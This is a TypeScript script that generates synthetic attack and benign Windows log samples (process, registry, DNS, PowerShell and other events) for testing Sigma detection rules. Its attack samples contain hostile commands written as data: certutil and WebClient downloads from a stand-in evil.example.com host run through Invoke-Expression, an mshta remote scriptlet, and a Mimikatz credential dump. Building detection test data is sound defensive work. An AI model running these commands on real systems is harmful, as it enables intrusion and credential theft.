#!/usr/bin/env bun
/**
 * Generate synthetic test log datasets for DetectForge.
 *
 * Creates attack and benign log samples for each Sigma logsource category
 * so that rules can be tested locally without a SIEM.
 *
 * Usage:
 *   bun scripts/generate-test-logs.ts                           # default output
 *   bun scripts/generate-test-logs.ts --output data/test-logs/  # custom output dir
 */

import { mkdirSync, writeFileSync } from 'node:fs';
import { join, resolve } from 'node:path';

// Templates
import { getAllTemplates } from '@/generation/sigma/templates.js';
import type { SigmaTemplate } from '@/generation/sigma/templates.js';

// ---------------------------------------------------------------------------
// CLI argument parsing
// ---------------------------------------------------------------------------

interface CLIArgs {
  output: string;
}

function parseCLIArgs(): CLIArgs {
  const args = process.argv.slice(2);
  const projectRoot = resolve(import.meta.dirname ?? '.', '..');
  let output = join(projectRoot, 'data', 'test-logs');

  for (let i = 0; i < args.length; i++) {
    if (args[i] === '--output' && i + 1 < args.length) {
      output = resolve(projectRoot, args[i + 1]);
      i++;
    }
  }

  return { output };
}

// ---------------------------------------------------------------------------
// Log entry type
// ---------------------------------------------------------------------------

interface LogEntry {
  [key: string]: string | number | boolean | null;
}

// ---------------------------------------------------------------------------
// Attack log generators per category
// ---------------------------------------------------------------------------

function generateAttackLogs(template: SigmaTemplate): LogEntry[] {
  const category = template.category;

  switch (category) {
    case 'process_creation':
      return generateProcessCreationAttackLogs();
    case 'image_load':
      return generateImageLoadAttackLogs();
    case 'file_event':
      return generateFileEventAttackLogs();
    case 'registry_event':
      return generateRegistryEventAttackLogs();
    case 'network_connection':
      return generateNetworkConnectionAttackLogs();
    case 'dns_query':
      return generateDnsQueryAttackLogs();
    case 'pipe_created':
      return generatePipeCreatedAttackLogs();
    case 'wmi_event':
      return generateWmiEventAttackLogs();
    case 'ps_script':
      return generatePsScriptAttackLogs();
    case 'security':
      return generateSecurityAttackLogs();
    default:
      return [];
  }
}

function generateBenignLogs(template: SigmaTemplate): LogEntry[] {
  const category = template.category;

  switch (category) {
    case 'process_creation':
      return generateProcessCreationBenignLogs();
    case 'image_load':
      return generateImageLoadBenignLogs();
    case 'file_event':
      return generateFileEventBenignLogs();
    case 'registry_event':
      return generateRegistryEventBenignLogs();
    case 'network_connection':
      return generateNetworkConnectionBenignLogs();
    case 'dns_query':
      return generateDnsQueryBenignLogs();
    case 'pipe_created':
      return generatePipeCreatedBenignLogs();
    case 'wmi_event':
      return generateWmiEventBenignLogs();
    case 'ps_script':
      return generatePsScriptBenignLogs();
    case 'security':
      return generateSecurityBenignLogs();
    default:
      return [];
  }
}

// ---------------------------------------------------------------------------
// Process Creation
// ---------------------------------------------------------------------------

function generateProcessCreationAttackLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      OriginalFileName: 'PowerShell.EXE',
      CommandLine: 'powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIA',
      ParentImage: 'C:\\Windows\\explorer.exe',
      ParentCommandLine: 'C:\\Windows\\explorer.exe',
      User: 'CORP\\jdoe',
      IntegrityLevel: 'High',
      CurrentDirectory: 'C:\\Users\\jdoe\\Desktop\\',
    },
    {
      Image: 'C:\\Windows\\System32\\cmd.exe',
      OriginalFileName: 'Cmd.Exe',
      CommandLine: 'cmd.exe /c whoami /all > C:\\Users\\Public\\info.txt',
      ParentImage: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      ParentCommandLine: 'powershell.exe -nop -w hidden -enc JABZ',
      User: 'CORP\\jdoe',
      IntegrityLevel: 'High',
      CurrentDirectory: 'C:\\Users\\jdoe\\',
    },
    {
      Image: 'C:\\Windows\\System32\\certutil.exe',
      OriginalFileName: 'CertUtil.exe',
      CommandLine: 'certutil -urlcache -split -f hxxp://evil.example.com/payload.exe C:\\Users\\Public\\update.exe',
      ParentImage: 'C:\\Windows\\System32\\cmd.exe',
      ParentCommandLine: 'cmd.exe /c certutil',
      User: 'CORP\\admin',
      IntegrityLevel: 'High',
      CurrentDirectory: 'C:\\Windows\\System32\\',
    },
    {
      Image: 'C:\\Windows\\System32\\mshta.exe',
      OriginalFileName: 'MSHTA.EXE',
      CommandLine: 'mshta.exe javascript:a=GetObject("script:hxxp://evil.example.com/s.sct")',
      ParentImage: 'C:\\Windows\\explorer.exe',
      ParentCommandLine: 'explorer.exe',
      User: 'CORP\\user1',
      IntegrityLevel: 'Medium',
      CurrentDirectory: 'C:\\Users\\user1\\Downloads\\',
    },
    {
      Image: 'C:\\Users\\Public\\svchost.exe',
      OriginalFileName: 'malware.exe',
      CommandLine: 'C:\\Users\\Public\\svchost.exe -connect 198.51.100.42:4444',
      ParentImage: 'C:\\Windows\\System32\\cmd.exe',
      ParentCommandLine: 'cmd.exe /c start svchost.exe',
      User: 'CORP\\user2',
      IntegrityLevel: 'Medium',
      CurrentDirectory: 'C:\\Users\\Public\\',
    },
  ];
}

function generateProcessCreationBenignLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Windows\\System32\\svchost.exe',
      OriginalFileName: 'svchost.exe',
      CommandLine: 'C:\\Windows\\System32\\svchost.exe -k netsvcs -p',
      ParentImage: 'C:\\Windows\\System32\\services.exe',
      ParentCommandLine: 'C:\\Windows\\System32\\services.exe',
      User: 'NT AUTHORITY\\SYSTEM',
      IntegrityLevel: 'System',
      CurrentDirectory: 'C:\\Windows\\System32\\',
    },
    {
      Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      OriginalFileName: 'chrome.exe',
      CommandLine: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer',
      ParentImage: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      ParentCommandLine: '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"',
      User: 'CORP\\user1',
      IntegrityLevel: 'Low',
      CurrentDirectory: 'C:\\Program Files\\Google\\Chrome\\Application\\',
    },
    {
      Image: 'C:\\Windows\\System32\\taskhostw.exe',
      OriginalFileName: 'taskhostw.exe',
      CommandLine: 'taskhostw.exe',
      ParentImage: 'C:\\Windows\\System32\\svchost.exe',
      ParentCommandLine: 'C:\\Windows\\System32\\svchost.exe -k netsvcs',
      User: 'NT AUTHORITY\\SYSTEM',
      IntegrityLevel: 'System',
      CurrentDirectory: 'C:\\Windows\\System32\\',
    },
    {
      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      OriginalFileName: 'PowerShell.EXE',
      CommandLine: 'powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1',
      ParentImage: 'C:\\Windows\\System32\\svchost.exe',
      ParentCommandLine: 'C:\\Windows\\System32\\svchost.exe -k netsvcs',
      User: 'NT AUTHORITY\\SYSTEM',
      IntegrityLevel: 'System',
      CurrentDirectory: 'C:\\Scripts\\',
    },
    {
      Image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
      OriginalFileName: 'WinWord.exe',
      CommandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\user1\\Documents\\report.docx"',
      ParentImage: 'C:\\Windows\\explorer.exe',
      ParentCommandLine: 'C:\\Windows\\explorer.exe',
      User: 'CORP\\user1',
      IntegrityLevel: 'Medium',
      CurrentDirectory: 'C:\\Users\\user1\\Documents\\',
    },
  ];
}

// ---------------------------------------------------------------------------
// Image Load
// ---------------------------------------------------------------------------

function generateImageLoadAttackLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Windows\\System32\\rundll32.exe',
      ImageLoaded: 'C:\\Users\\Public\\malicious.dll',
      OriginalFileName: 'malicious.dll',
      Signed: false,
      SignatureStatus: 'Unsigned',
      User: 'CORP\\jdoe',
    },
    {
      Image: 'C:\\Windows\\System32\\svchost.exe',
      ImageLoaded: 'C:\\Windows\\Temp\\procdump.dll',
      OriginalFileName: 'procdump.dll',
      Signed: false,
      SignatureStatus: 'Unsigned',
      User: 'NT AUTHORITY\\SYSTEM',
    },
  ];
}

function generateImageLoadBenignLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Windows\\System32\\svchost.exe',
      ImageLoaded: 'C:\\Windows\\System32\\kernel32.dll',
      OriginalFileName: 'kernel32.dll',
      Signed: true,
      SignatureStatus: 'Valid',
      User: 'NT AUTHORITY\\SYSTEM',
    },
    {
      Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      ImageLoaded: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome_elf.dll',
      OriginalFileName: 'chrome_elf.dll',
      Signed: true,
      SignatureStatus: 'Valid',
      User: 'CORP\\user1',
    },
  ];
}

// ---------------------------------------------------------------------------
// File Event
// ---------------------------------------------------------------------------

function generateFileEventAttackLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      TargetFilename: 'C:\\Users\\Public\\payload.exe',
      CreationUtcTime: '2026-02-10 12:00:00.000',
      User: 'CORP\\jdoe',
    },
    {
      Image: 'C:\\Windows\\System32\\cmd.exe',
      TargetFilename: 'C:\\Users\\jdoe\\AppData\\Local\\Temp\\mimikatz.exe',
      CreationUtcTime: '2026-02-10 12:05:00.000',
      User: 'CORP\\jdoe',
    },
  ];
}

function generateFileEventBenignLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      TargetFilename: 'C:\\Users\\user1\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\entry.dat',
      CreationUtcTime: '2026-02-10 10:00:00.000',
      User: 'CORP\\user1',
    },
    {
      Image: 'C:\\Windows\\System32\\svchost.exe',
      TargetFilename: 'C:\\Windows\\Temp\\cab_12345_6',
      CreationUtcTime: '2026-02-10 08:30:00.000',
      User: 'NT AUTHORITY\\SYSTEM',
    },
  ];
}

// ---------------------------------------------------------------------------
// Registry Event
// ---------------------------------------------------------------------------

function generateRegistryEventAttackLogs(): LogEntry[] {
  return [
    {
      EventType: 'SetValue',
      Image: 'C:\\Windows\\System32\\reg.exe',
      TargetObject: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater',
      Details: 'C:\\Users\\Public\\updater.exe',
      User: 'CORP\\admin',
    },
    {
      EventType: 'SetValue',
      Image: 'C:\\Users\\Public\\malware.exe',
      TargetObject: 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost',
      Details: 'C:\\Users\\Public\\svchost.exe',
      User: 'CORP\\jdoe',
    },
  ];
}

function generateRegistryEventBenignLogs(): LogEntry[] {
  return [
    {
      EventType: 'SetValue',
      Image: 'C:\\Windows\\System32\\svchost.exe',
      TargetObject: 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin',
      Details: 'DWORD (0x00000005)',
      User: 'NT AUTHORITY\\SYSTEM',
    },
    {
      EventType: 'SetValue',
      Image: 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE',
      TargetObject: 'HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Options\\DefaultDir',
      Details: 'C:\\Users\\user1\\Documents',
      User: 'CORP\\user1',
    },
  ];
}

// ---------------------------------------------------------------------------
// Network Connection
// ---------------------------------------------------------------------------

function generateNetworkConnectionAttackLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Users\\Public\\svchost.exe',
      User: 'CORP\\jdoe',
      Protocol: 'tcp',
      Initiated: true,
      SourceIp: '10.0.1.50',
      SourcePort: 49152,
      DestinationIp: '198.51.100.42',
      DestinationHostname: '',
      DestinationPort: 4444,
    },
    {
      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      User: 'CORP\\jdoe',
      Protocol: 'tcp',
      Initiated: true,
      SourceIp: '10.0.1.50',
      SourcePort: 49200,
      DestinationIp: '203.0.113.10',
      DestinationHostname: 'evil.example.com',
      DestinationPort: 443,
    },
  ];
}

function generateNetworkConnectionBenignLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      User: 'CORP\\user1',
      Protocol: 'tcp',
      Initiated: true,
      SourceIp: '10.0.1.100',
      SourcePort: 50000,
      DestinationIp: '142.250.80.100',
      DestinationHostname: 'www.google.com',
      DestinationPort: 443,
    },
    {
      Image: 'C:\\Windows\\System32\\svchost.exe',
      User: 'NT AUTHORITY\\NETWORK SERVICE',
      Protocol: 'tcp',
      Initiated: true,
      SourceIp: '10.0.1.5',
      SourcePort: 50100,
      DestinationIp: '20.190.159.0',
      DestinationHostname: 'login.microsoftonline.com',
      DestinationPort: 443,
    },
  ];
}

// ---------------------------------------------------------------------------
// DNS Query
// ---------------------------------------------------------------------------

function generateDnsQueryAttackLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Users\\Public\\beacon.exe',
      QueryName: 'c2.evil.example.com',
      QueryStatus: '0',
      QueryResults: '198.51.100.42',
      User: 'CORP\\jdoe',
    },
    {
      Image: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
      QueryName: 'data.exfil.example.com',
      QueryStatus: '0',
      QueryResults: '203.0.113.50',
      User: 'CORP\\admin',
    },
  ];
}

function generateDnsQueryBenignLogs(): LogEntry[] {
  return [
    {
      Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      QueryName: 'www.google.com',
      QueryStatus: '0',
      QueryResults: '142.250.80.100',
      User: 'CORP\\user1',
    },
    {
      Image: 'C:\\Windows\\System32\\svchost.exe',
      QueryName: 'wpad.corp.local',
      QueryStatus: '0',
      QueryResults: '',
      User: 'NT AUTHORITY\\NETWORK SERVICE',
    },
  ];
}

// ---------------------------------------------------------------------------
// Pipe Created
// ---------------------------------------------------------------------------

function generatePipeCreatedAttackLogs(): LogEntry[] {
  return [
    {
      PipeName: '\\MSSE-1234-server',
      Image: 'C:\\Users\\Public\\beacon.exe',
      User: 'CORP\\jdoe',
    },
    {
      PipeName: '\\postex_ssh_12345',
      Image: 'C:\\Windows\\System32\\rundll32.exe',
      User: 'CORP\\admin',
    },
  ];
}

function generatePipeCreatedBenignLogs(): LogEntry[] {
  return [
    {
      PipeName: '\\lsass',
      Image: 'C:\\Windows\\System32\\lsass.exe',
      User: 'NT AUTHORITY\\SYSTEM',
    },
    {
      PipeName: '\\chrome.12345.0.123456789',
      Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      User: 'CORP\\user1',
    },
  ];
}

// ---------------------------------------------------------------------------
// WMI Event
// ---------------------------------------------------------------------------

function generateWmiEventAttackLogs(): LogEntry[] {
  return [
    {
      EventType: 'WmiConsumerEvent',
      Operation: 'Created',
      User: 'CORP\\admin',
      EventNamespace: 'root\\subscription',
      Name: 'EvilConsumer',
      Destination: 'powershell.exe -nop -w hidden -enc JABz',
      Consumer: 'CommandLineEventConsumer',
    },
  ];
}

function generateWmiEventBenignLogs(): LogEntry[] {
  return [
    {
      EventType: 'WmiConsumerEvent',
      Operation: 'Created',
      User: 'NT AUTHORITY\\SYSTEM',
      EventNamespace: 'root\\subscription',
      Name: 'SCCMConsumer',
      Destination: 'C:\\Windows\\CCM\\ccmexec.exe',
      Consumer: 'CommandLineEventConsumer',
    },
  ];
}

// ---------------------------------------------------------------------------
// PS Script (PowerShell Script Block Logging)
// ---------------------------------------------------------------------------

function generatePsScriptAttackLogs(): LogEntry[] {
  return [
    {
      ScriptBlockText: 'Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonPasswords exit"',
      ScriptBlockId: '{12345678-1234-1234-1234-123456789abc}',
      Path: '',
      MessageNumber: 1,
      MessageTotal: 1,
    },
    {
      ScriptBlockText: '$wc = New-Object Net.WebClient; $wc.DownloadString("hxxp://evil.example.com/payload.ps1") | Invoke-Expression',
      ScriptBlockId: '{22345678-1234-1234-1234-123456789abc}',
      Path: 'C:\\Users\\jdoe\\Downloads\\update.ps1',
      MessageNumber: 1,
      MessageTotal: 1,
    },
    {
      ScriptBlockText: '[Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAA")',
      ScriptBlockId: '{32345678-1234-1234-1234-123456789abc}',
      Path: '',
      MessageNumber: 1,
      MessageTotal: 1,
    },
  ];
}

function generatePsScriptBenignLogs(): LogEntry[] {
  return [
    {
      ScriptBlockText: 'Get-Process | Where-Object { $_.CPU -gt 100 } | Select-Object Name, CPU',
      ScriptBlockId: '{aaaaaaaa-1111-1111-1111-111111111111}',
      Path: 'C:\\Scripts\\monitor.ps1',
      MessageNumber: 1,
      MessageTotal: 1,
    },
    {
      ScriptBlockText: 'Install-Module -Name Az -Scope CurrentUser -Force',
      ScriptBlockId: '{bbbbbbbb-2222-2222-2222-222222222222}',
      Path: '',
      MessageNumber: 1,
      MessageTotal: 1,
    },
  ];
}

// ---------------------------------------------------------------------------
// Security (Windows Security Event Log)
// ---------------------------------------------------------------------------

function generateSecurityAttackLogs(): LogEntry[] {
  return [
    {
      EventID: 4625,
      SubjectUserName: '-',
      TargetUserName: 'admin',
      TargetDomainName: 'CORP',
      LogonType: 10,
      IpAddress: '198.51.100.42',
      IpPort: '49152',
      Status: '0xc000006d',
    },
    {
      EventID: 4625,
      SubjectUserName: '-',
      TargetUserName: 'svc_backup',
      TargetDomainName: 'CORP',
      LogonType: 3,
      IpAddress: '198.51.100.42',
      IpPort: '49153',
      Status: '0xc000006d',
    },
    {
      EventID: 4720,
      SubjectUserName: 'compromised_admin',
      TargetUserName: 'backdoor_user',
      TargetDomainName: 'CORP',
      LogonType: 0,
      IpAddress: '-',
      IpPort: '-',
      Status: '0x0',
    },
  ];
}

function generateSecurityBenignLogs(): LogEntry[] {
  return [
    {
      EventID: 4624,
      SubjectUserName: '-',
      TargetUserName: 'user1',
      TargetDomainName: 'CORP',
      LogonType: 2,
      IpAddress: '10.0.1.100',
      IpPort: '0',
      Status: '0x0',
    },
    {
      EventID: 4624,
      SubjectUserName: '-',
      TargetUserName: 'svc_sql',
      TargetDomainName: 'CORP',
      LogonType: 5,
      IpAddress: '-',
      IpPort: '-',
      Status: '0x0',
    },
    {
      EventID: 4634,
      SubjectUserName: 'user1',
      TargetUserName: '-',
      TargetDomainName: 'CORP',
      LogonType: 2,
      IpAddress: '-',
      IpPort: '-',
      Status: '0x0',
    },
  ];
}

// ---------------------------------------------------------------------------
// Main
// ---------------------------------------------------------------------------

function main(): void {
  const args = parseCLIArgs();

  console.log('[generate-test-logs] Starting synthetic log generation...');
  console.log(`[generate-test-logs] Output directory: ${args.output}`);

  const templates = getAllTemplates();
  console.log(`[generate-test-logs] Found ${templates.length} Sigma template categories.`);

  let totalAttack = 0;
  let totalBenign = 0;

  for (const template of templates) {
    const category = template.category;

    // Generate attack logs
    const attackLogs = generateAttackLogs(template);
    const benignLogs = generateBenignLogs(template);

    if (attackLogs.length === 0 && benignLogs.length === 0) {
      console.log(`  [skip] ${category}: no log generators available`);
      continue;
    }

    // Write attack logs
    if (attackLogs.length > 0) {
      const attackDir = join(args.output, 'attack');
      mkdirSync(attackDir, { recursive: true });
      const attackPath = join(attackDir, `${category}.json`);
      writeFileSync(attackPath, JSON.stringify(attackLogs, null, 2), 'utf-8');
      totalAttack += attackLogs.length;
    }

    // Write benign logs
    if (benignLogs.length > 0) {
      const benignDir = join(args.output, 'benign');
      mkdirSync(benignDir, { recursive: true });
      const benignPath = join(benignDir, `${category}.json`);
      writeFileSync(benignPath, JSON.stringify(benignLogs, null, 2), 'utf-8');
      totalBenign += benignLogs.length;
    }

    console.log(
      `  [done] ${category}: ${attackLogs.length} attack, ${benignLogs.length} benign`,
    );
  }

  console.log('');
  console.log('[generate-test-logs] Summary:');
  console.log(`  Categories processed: ${templates.length}`);
  console.log(`  Attack logs generated: ${totalAttack}`);
  console.log(`  Benign logs generated: ${totalBenign}`);
  console.log(`  Total log entries: ${totalAttack + totalBenign}`);
  console.log(`  Output directory: ${args.output}`);
  console.log('[generate-test-logs] Done.');
}

main();
